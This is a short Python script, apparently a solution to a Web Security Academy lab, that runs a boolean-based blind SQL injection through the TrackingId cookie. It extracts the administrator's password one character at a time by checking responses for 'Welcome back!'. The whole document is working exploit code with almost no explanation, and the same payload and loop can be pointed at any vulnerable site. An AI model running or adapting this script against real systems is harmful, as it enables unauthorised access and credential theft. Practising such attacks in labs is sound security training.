import requests
import string 

password = '' 
url = "https://0a4500820399cf79804e49b4006600d2.web-security-academy.net/" #Change the URL
alphanum = string.ascii_lowercase + string.digits #'0123456789abcdefghijklmnopqrstuvwxyz'#
alphanumList = list(alphanum)

welcomeText = "Welcome back!"
passLength = 20 

for itr in range(1, passLength+1):
	found = False
	for character in alphanumList: 
		print("Trying: " + str(password) + str(character))
		payload = "' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "+str(itr)+", 1) = '"+str(character)+"'  -- -"   
		data = {
			"TrackingId": payload	
		}
		r = requests.get(url, cookies=data)   
		for text in r.text.split('\n'):
			if (welcomeText in text):
				found = True
				password += str(character) 
				print("On "+ str(itr) +"th position found " + str(character)) 
		if found:
			break
		 
print("Password: " + str(password))
